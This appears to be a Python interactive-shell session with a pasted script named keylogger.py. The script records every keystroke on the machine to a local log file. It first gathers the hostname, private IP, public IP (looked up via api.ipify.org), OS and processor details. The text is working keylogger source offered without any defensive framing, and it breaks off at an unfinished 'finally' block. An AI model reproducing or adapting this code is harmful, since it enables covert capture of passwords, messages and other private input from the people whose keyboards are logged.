Python 3.12.10 (tags/v3.12.10:0cc8128, Apr  8 2025, 12:21:36) [MSC v.1943 64 bit (AMD64)] on win32
Enter "help" below or click "Help" above for more information.
# keylogger.py
from pynput.keyboard import Key, Listener
import logging
import socket
import platform
from requests import get

# Configuration
LOG_DIRECTORY = ""
LOG_FILE = "key_log.txt"

# Setup logging
logging.basicConfig(
    filename=LOG_DIRECTORY + LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

def collect_system_info():
    """Collect and log system information"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        
        logging.info("[SYSTEM INFO START]")
        logging.info(f"Hostname: {hostname}")
        logging.info(f"Private IP: {ip_address}")
        
        try:
            public_ip = get("https://api.ipify.org").text
            logging.info(f"Public IP: {public_ip}")
        except Exception as e:
...             logging.error(f"Could not get public IP: {str(e)}")
...             
...         logging.info(f"OS: {platform.system()} {platform.version()}")
...         logging.info(f"Architecture: {platform.machine()}")
...         logging.info(f"Processor: {platform.processor()}")
...         logging.info("[SYSTEM INFO END]\n")
...         
...     except Exception as e:
...         logging.error(f"Error collecting system info: {str(e)}")
... 
... def on_key_press(key):
...     """Handle key press events"""
...     try:
...         # Handle special keys
...         if key == Key.space:
...             logging.info(" ")
...         elif key == Key.enter:
...             logging.info("[ENTER]")
...         elif key == Key.backspace:
...             logging.info("[BACKSPACE]")
...         else:
...             logging.info(str(key).replace("'", ""))
...             
...     except Exception as e:
...         logging.error(f"Error logging key: {str(e)}")
... 
... if __name__ == "__main__":
...     # Collect initial system information
...     collect_system_info()
...     
...     # Start keylogger
...     try:
...         with Listener(on_press=on_key_press) as listener:
...             logging.info("[KEYLOGGER STARTED]")
...             listener.join()
...             
...     except Exception as e:
...         logging.error(f"Keylogger error: {str(e)}")
...     finally:
